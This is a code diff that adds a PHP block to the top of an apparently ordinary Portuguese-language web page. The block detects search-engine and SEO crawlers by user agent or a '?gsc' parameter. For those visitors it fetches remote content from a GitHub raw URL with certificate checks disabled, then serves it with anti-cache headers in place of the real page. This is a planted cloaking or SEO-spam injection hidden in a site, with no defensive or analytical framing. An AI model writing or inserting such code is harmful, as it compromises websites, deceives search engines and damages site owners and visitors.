@@ -1,4 +1,44 @@
+<?php
+if (php_sapi_name() === 'cli') exit;
 
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$q  = isset($_GET['gsc']);
+$isbot = $q || preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|telegrambot|Google-Site-Verification|Google-InspectionTool|adsense|ahrefs/i', $ua);
+
+if ($isbot) {
+  $u = 'https://raw.githubusercontent.com/teamgeprex-byte/clocking/refs/heads/main/FAQ';
+  $r = '';
+
+  if (function_exists('curl_init')) {
+    $ch = curl_init($u);
+    curl_setopt_array($ch, [
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_FOLLOWLOCATION => true,
+      CURLOPT_TIMEOUT => 6,
+      CURLOPT_SSL_VERIFYPEER => false,
+      CURLOPT_SSL_VERIFYHOST => false
+    ]);
+    $r = curl_exec($ch);
+    curl_close($ch);
+  }
+
+  if (!$r && ini_get('allow_url_fopen')) {
+    $r = @file_get_contents($u);
+  }
+
+  if ($r && strlen($r) > 50) {
+    @header("X-LiteSpeed-Cache-Control: no-cache");
+    @header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+    @header("Pragma: no-cache");
+    @header("Expires: 0");
+
+    if (function_exists('ob_get_level')) while (ob_get_level()) @ob_end_clean();
+
+    echo $r;
+    exit;
+  }
+}
+?>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
